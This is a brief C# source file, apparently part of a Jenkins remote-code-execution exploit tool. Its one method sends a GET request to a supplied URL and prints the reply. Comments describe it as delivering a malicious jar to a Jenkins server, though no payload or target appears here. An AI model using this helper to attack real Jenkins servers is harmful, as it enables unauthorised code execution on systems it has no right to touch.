using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace jenkins_server_rce.jenkinsrequests
{
    public class jenkins_requests
    {
        //Function Call: SendPayloadInGETRequest(string url)
        //Function Parameters => Return Type : String => Void
        //Function Purpose: Will send the malicios GET request with the malicious
        //jar file to Jenkins server
        public static void SendPayloadInGETRequest(string url, HttpClient client)
        {
            Console.WriteLine("Printing result...");
            //try
            //
            using (HttpResponseMessage response = client.GetAsync(url).Result)
            {
                Console.WriteLine(response);
                using (HttpContent content = response.Content)
                {
                    string myContent = content.ReadAsStringAsync().Result;
                    Console.WriteLine(myContent);
                }
            }
            //} catch (Exception e) { 
            //    Console.WriteLine($"Exception caught during get request to {url}");
            //    Console.WriteLine('*' * 20);
            //    Console.WriteLine($"Exceptions: {e}");
            //}


        }
    }
}
